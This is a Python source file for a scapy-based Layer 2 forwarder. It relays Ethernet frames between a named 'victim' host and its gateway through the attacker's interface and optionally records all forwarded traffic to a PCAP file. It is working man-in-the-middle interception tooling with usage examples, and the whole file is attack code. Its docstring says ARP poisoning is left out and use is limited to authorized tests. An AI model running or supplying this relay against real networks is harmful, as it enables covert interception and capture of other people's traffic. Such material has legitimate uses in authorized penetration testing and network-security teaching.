#!/usr/bin/env python3
"""
mobile.py - programmatic-only L2 forwarder (no CLI)

Usage examples:

# Blocking mode (call blocks until you call redirector.stop()):
import mobile
redirector = mobile.main("eth0", "192.168.1.100", "192.168.1.1", pcap="/tmp/capture.pcap", background=False)
# (When start returns it means sniffing finished; normally you call stop() from elsewhere.)

# Background mode (returns immediately with running redirector):
import mobile
redirector = mobile.main("eth0", "192.168.1.100", "192.168.1.1", pcap="/tmp/capture.pcap", background=True)
# do work...
redirector.stop()
"""

import os
import threading
from scapy.all import get_if_hwaddr, srp, Ether, ARP, sendp, sniff
from scapy.utils import PcapWriter


class L2Redirect:
    """
    Forward Ethernet frames between victim and gateway on iface.
    Note: this module does NOT perform ARP poisoning; it only forwards frames
    that are already seen on the interface. Use only on networks you are authorized to test.
    """

    def __init__(self, iface: str, victim_ip: str, gateway_ip: str, pcap_path: str | None = None):
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.pcap_path = pcap_path

        try:
            self.attacker_mac = get_if_hwaddr(self.iface)
        except Exception as e:
            raise RuntimeError(f"Could not get MAC for interface {self.iface}: {e}")

        self.victim_mac = None
        self.gateway_mac = None
        self._pcap_writer = None
        self._stop_event = threading.Event()

    def resolve_mac(self, ip: str, timeout: int = 2) -> str | None:
        """
        Send an ARP who-has and return the hwsrc from the ARP reply (MAC) or None.
        """
        arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(arp_req, iface=self.iface, timeout=timeout, verbose=0)
        for _, received in ans:
            try:
                return received[ARP].hwsrc
            except Exception:
                try:
                    return received[Ether].src
                except Exception:
                    continue
        return None

    def setup(self) -> None:
        """
        Resolve victim and gateway MACs and prepare PCAP writer if requested.
        Raises RuntimeError if MACs cannot be resolved.
        """
        self.victim_mac = self.resolve_mac(self.victim_ip)
        self.gateway_mac = self.resolve_mac(self.gateway_ip)
        if not self.victim_mac or not self.gateway_mac:
            raise RuntimeError(
                f"Could not resolve MACs (victim={self.victim_mac}, gateway={self.gateway_mac})"
            )

        if self.pcap_path:
            try:
                self._pcap_writer = PcapWriter(self.pcap_path, append=False, sync=True)
            except Exception:
                # don't fail setup just because pcap open failed; warn via exception if caller wants
                self._pcap_writer = None

    def _write_packet(self, pkt) -> None:
        if self._pcap_writer:
            try:
                self._pcap_writer.write(pkt)
            except Exception:
                pass

    def forward_packet(self, pkt) -> None:
        """
        Callback used by sniff(): forwards packets between victim and gateway by
        rewriting Ether.src/Ether.dst and sending with sendp().
        """
        if self._stop_event.is_set():
            return

        if not pkt.haslayer(Ether):
            return

        eth = pkt[Ether]
        src = eth.src.lower()
        attacker = self.attacker_mac.lower()
        victim = self.victim_mac.lower()
        gateway = self.gateway_mac.lower()

        # ignore packets we already sent
        if src == attacker:
            return

        new_pkt = pkt.copy()
        if src == victim:
            new_pkt[Ether].src = self.attacker_mac
            new_pkt[Ether].dst = self.gateway_mac
            try:
                sendp(new_pkt, iface=self.iface, verbose=0)
                self._write_packet(new_pkt)
            except Exception:
                pass
        elif src == gateway:
            new_pkt[Ether].src = self.attacker_mac
            new_pkt[Ether].dst = self.victim_mac
            try:
                sendp(new_pkt, iface=self.iface, verbose=0)
                self._write_packet(new_pkt)
            except Exception:
                pass

    def _sniff_loop(self) -> None:
        """
        Internal blocking sniff loop. Uses stop_filter to exit when stop() is called.
        """
        bpf = f"(ether src {self.victim_mac}) or (ether src {self.gateway_mac})"

        def stop_filter(pkt):
            return self._stop_event.is_set()

        sniff(iface=self.iface, prn=self.forward_packet, filter=bpf, store=0, stop_filter=stop_filter)

    def start(self, background: bool = False) -> threading.Thread | None:
        """
        Start forwarding:
          - If background=True -> start a daemon thread and return the Thread.
          - If background=False -> run in current thread (blocking) and return None.
        Preconditions: call setup() before start().
        """
        if not self.victim_mac or not self.gateway_mac:
            raise RuntimeError("MAC addresses not resolved; call setup() first.")

        self._stop_event.clear()
        if background:
            t = threading.Thread(target=self._sniff_loop, daemon=True)
            t.start()
            return t
        else:
            self._sniff_loop()
            return None

    def stop(self) -> None:
        """
        Signal the sniff loop to stop and close PCAP writer if open.
        """
        self._stop_event.set()
        if self._pcap_writer:
            try:
                self._pcap_writer.close()
            except Exception:
                pass


def main(iface: str, victim: str, gateway: str, pcap: str | None = None, background: bool = True) -> L2Redirect:
    """
    Programmatic entrypoint (no CLI).

    - iface: interface name (string)
    - victim: victim IP (string)
    - gateway: gateway IP (string)
    - pcap: optional path to PCAP file to write forwarded packets
    - background: if True, start sniffing in a background thread and return the L2Redirect object.
                  if False, call blocks in the current thread until stop() is called; then return L2Redirect.

    Returns: L2Redirect instance (if background=True, sniffing already started).
    Raises: RuntimeError on failures (e.g., not root, unresolved MACs).
    """
    if os.geteuid() != 0:
        raise RuntimeError("must run as root")

    redirector = L2Redirect(iface, victim, gateway, pcap_path=pcap)
    redirector.setup()
    thread = redirector.start(background=background)
    return redirector
